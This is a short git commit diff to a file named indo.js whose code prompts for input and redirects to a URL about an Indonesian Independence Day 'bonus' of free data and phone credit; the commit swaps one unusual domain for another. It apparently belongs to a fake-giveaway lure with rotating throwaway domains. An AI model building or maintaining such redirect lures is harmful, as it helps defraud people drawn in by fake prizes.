90798cee8b4ab9edceff0daa7e7c434abc8cb5ba
weallneedgod <darter-deaths2p@icloud.com>
2026-08-16 20:21:52 -1200

    Update redirect URL in indo.js

--- indo.js
+++ indo.js
@@ -5,6 +5,6 @@ password = prompt(
 
 );if (password != '25GB DATA + Pulsa Rp30,000') {
 
-    location.href = 'https://www.mboroekpe.ink/bonus-perayaan-hari-kemerdekaan';
+    location.href = 'https://www.okukinorda.blog/bonus-perayaan-hari-kemerdekaan';
 
 }
